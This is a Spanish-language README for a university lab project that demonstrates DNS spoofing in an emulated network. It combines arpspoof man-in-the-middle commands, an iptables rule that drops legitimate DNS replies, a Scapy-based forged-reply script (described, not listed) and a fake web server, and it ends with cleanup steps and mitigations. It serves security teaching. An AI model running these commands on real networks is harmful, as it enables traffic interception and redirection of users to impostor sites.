# DNS Spoofing Attack — Envenenamiento de Registro DNS

## Objetivo del Ataque

Redirigir las consultas DNS del dominio `itla.edu.do` hacia la IP del atacante (`10.7.2.151`), sirviendo una página web falsa en lugar del sitio institucional legítimo.

## Descripción

Este proyecto demuestra un ataque de **DNS Spoofing (Envenenamiento DNS)** utilizando **Python y Scapy**, combinado con **ARP Spoofing** (mediante `arpspoof`) para el posicionamiento MitM e **iptables** para garantizar que la respuesta falsa llegue antes que la legítima. El ataque redirige las consultas DNS de un dominio específico hacia una IP controlada por el atacante.

Este ataque es la fase final de una cadena que incluye **DTP VLAN Hopping** (ver repositorio `DTP Attack`) y la creación de la subinterfaz VLAN 10 en el atacante para tener visibilidad del tráfico de la víctima.

Link al video: https://youtu.be/tRnX6pLoCw0

## Topología de Red

```
               [ R1 — Gateway / DNS ]
                    (10.7.2.254)
                    dns: itla.edu.do → 10.7.2.222
                         |
                         | trunk
                         |
                   [ SW-1 — Core ]
                   (10.7.2.1)
                  /
         trunk  /
               /
     [ SW-2 — Acceso ]
      (10.7.2.2)
        |              |
  trunk |              | access VLAN 10
 (post-DTP)           |
        |              |
  [Atacante]       [Víctima]
  (10.7.2.151)     (10.7.2.100)
  ens3.10          DNS server: 10.7.2.254
```

## Entorno del Laboratorio

| Dispositivo | Dirección IP | Función |
|---|---|---|
| **R1 (Router)** | `10.7.2.254` | Gateway y servidor DNS legítimo |
| **Atacante (user-pc)** | `10.7.2.151` | Estación de ataque / servidor web falso |
| **Víctima** | `10.7.2.100` | Objetivo del envenenamiento DNS |
| **IP legítima de itla.edu.do** | `10.7.2.222` | Simulada en R1 con `ip host` |

- **Segmento de red:** `10.7.2.0/24`
- **Interfaz del atacante:** `ens3.10` (subinterfaz VLAN 10)
- **Dominio objetivo:** `itla.edu.do`
- **Simulador:** PNETLab

## ¿Por qué funciona?

DNS no tiene mecanismo de autenticación en su versión clásica. Cualquier respuesta que llegue a la víctima con el mismo ID de transacción que la consulta original será aceptada. Al estar posicionados como MitM mediante ARP Spoofing y bloquear la respuesta legítima con iptables, nuestra respuesta falsa es la única que llega a la víctima.

## Pre-requisito: DTP Hopping y Subinterfaz VLAN 10

El acceso trunk al switch debe haberse obtenido previamente. Luego, crear la subinterfaz:

```bash
sudo ip link add link ens3 name ens3.10 type vlan id 10
sudo ip addr add 10.7.2.151/24 dev ens3.10
sudo ip link set dev ens3.10 up
sudo ip link set dev ens3 up
```

Verificar conectividad con la víctima:

```bash
ping 10.7.2.100
```

## Requisitos

### Software

- **Python 3.x**
- **Scapy** (`pip install scapy`)
- **dsniff** — para `arpspoof` (`sudo apt install dsniff`)
- **iptables** — incluido en Linux
- Permisos de superusuario (root)

### Instalación

```bash
sudo apt update
sudo apt install python3 python3-pip dsniff -y
pip install scapy
```

## Uso — 4 Terminales Simultáneas

### Terminal 1 — ARP Spoofing hacia la víctima

Le dice a la víctima que el atacante es R1:

```bash
sudo arpspoof -i ens3.10 -t 10.7.2.100 10.7.2.254
```

### Terminal 2 — ARP Spoofing hacia el gateway

Le dice a R1 que el atacante es la víctima:

```bash
sudo arpspoof -i ens3.10 -t 10.7.2.254 10.7.2.100
```

### Terminal 3 — Habilitar forwarding y bloquear respuesta legítima

```bash
# Permite que el tráfico fluya a través del atacante
sudo sysctl -w net.ipv4.ip_forward=1

# Bloquea que la respuesta DNS legítima de R1 llegue a la víctima
sudo iptables -I FORWARD -p udp --sport 53 -s 10.7.2.254 -j DROP
```

### Terminal 4 — Ejecutar el script de DNS Spoofing

```bash
sudo python3 DNS_Spoofing.py
```

## Parámetros del Script

| Parámetro | Valor | Descripción |
|---|---|---|
| `IFACE` | `ens3.10` | Subinterfaz VLAN 10 del atacante |
| `ATACANTE` | `10.7.2.151` | IP a la que se redirige el tráfico |
| `OBJETIVO` | `itla.edu.do` | Dominio a interceptar |
| `filter` | `udp port 53` | Captura solo tráfico DNS |

## Servidor Web Falso (opcional)

Para demostrar la redirección completa, levanta un servidor web en el atacante:

```bash
mkdir -p /tmp/fakeweb
echo "<h1>Sitio falso — itla.edu.do</h1><p>DNS Spoofing exitoso</p>" > /tmp/fakeweb/index.html
cd /tmp/fakeweb
sudo python3 -m http.server 80
```

## Cómo Funciona el Ataque

### Paso 1: Posicionamiento MitM

ARP Spoofing hace que la víctima envíe su tráfico al atacante creyendo que es R1, y R1 le responde a él creyendo que es la víctima.

### Paso 2: Bloquear la respuesta legítima

iptables descarta las respuestas DNS de R1 antes de que lleguen a la víctima, eliminando la competencia de velocidad con Scapy.

### Paso 3: Interceptar la consulta DNS

Scapy escucha en `ens3.10` filtrando `udp port 53`. Detecta la consulta de tipo `A` para `itla.edu.do`.

### Paso 4: Construir la respuesta falsa

El script construye un paquete DNS de respuesta con:
- **ID de transacción:** copiado del paquete original
- **Registro A:** apunta a `10.7.2.151` (el atacante)
- **TTL:** 10 segundos

### Paso 5: Inyectar la respuesta maliciosa

La respuesta falsa se envía a nivel de Capa 2 con `sendp()`, asegurando que llegue al cliente antes que cualquier respuesta legítima remanente.

## Verificación del Ataque

Desde la máquina víctima:

```bash
nslookup itla.edu.do
```

**Resultado esperado:**

```
Server:   10.7.2.254
Address:  10.7.2.254#53

Name:   itla.edu.do
Address: 10.7.2.151    ← IP del atacante en lugar de 10.7.2.222
```

Salida del script en el atacante:

```
[*] Escuchando en ens3.10...
[+] Interceptado: itla.edu.do. desde 10.7.2.100
[+] Respuesta falsa enviada: itla.edu.do → 10.7.2.151
```

## Flujo del Ataque

```
[Víctima]                  [Atacante]                  [R1 DNS]
10.7.2.100                 10.7.2.151                  10.7.2.254
    │                           │                           │
    │── DNS Query itla.edu.do ─▶│                           │
    │                           │── DNS Query (forward) ──▶ │
    │                           │                           │
    │                           │◀── DNS Reply (legítima) ──│
    │                           │   (bloqueada por iptables)│
    │                           │                           │
    │◀── DNS Reply FALSA ───────│                           │
    │    itla.edu.do = 10.7.2.151                           │
    │                           │                           │
    │── HTTP GET / ────────────▶│                           │
    │◀── Página web falsa ──────│                           │
```

## Limpieza después del Laboratorio

```bash
# Eliminar regla iptables
sudo iptables -D FORWARD -p udp --sport 53 -s 10.7.2.254 -j DROP

# Detener arpspoof (Ctrl+C en Terminales 1 y 2)

# Desactivar forwarding
sudo sysctl -w net.ipv4.ip_forward=0

# Eliminar subinterfaz VLAN
sudo ip link delete ens3.10
```

## Mitigaciones

- **DNSSEC** — agrega firmas digitales a las respuestas DNS, impidiendo que respuestas falsas sean aceptadas.
- **DNS sobre HTTPS (DoH)** — cifra las consultas DNS dentro de HTTPS.
- **DNS sobre TLS (DoT)** — cifra las comunicaciones DNS con TLS.
- **Dynamic ARP Inspection (DAI)** — valida paquetes ARP en switches Cisco, previniendo el ARP Spoofing.
  ```
  SW(config)# ip arp inspection vlan 10
  ```
- **DHCP Snooping** — prerequisito de DAI, crea una tabla de asignaciones IP-MAC confiables.

## Estructura del Repositorio

```
DNS_Spoofing_Attack/
├── DNS_Spoofing.py     # Script principal del ataque
└── README.md           # Esta documentación
```

## Tecnologías Utilizadas

- **Python 3** — lenguaje base del script
- **Scapy** — manipulación y construcción de paquetes de red
- **dsniff / arpspoof** — envenenamiento ARP para posicionamiento MitM
- **iptables** — filtrado de paquetes para garantizar que la respuesta falsa gane la carrera
- **PNETLab** — plataforma de emulación de red
- **Cisco IOS** — switches y router virtualizados

---

> **⚠️ AVISO IMPORTANTE**
>
> Este laboratorio fue desarrollado **exclusivamente con fines educativos** como parte de la materia **Seguridad de Redes** en el **Instituto Tecnológico de Las Américas (ITLA)**.
>
> El uso de estas técnicas en redes sin autorización explícita es **ilegal** y puede conllevar consecuencias legales severas.
>
> **Matrícula:** 2025-0702
> **Docente:** Jonathan Rondón
> **Institución:** Instituto Tecnológico de Las Américas (ITLA)
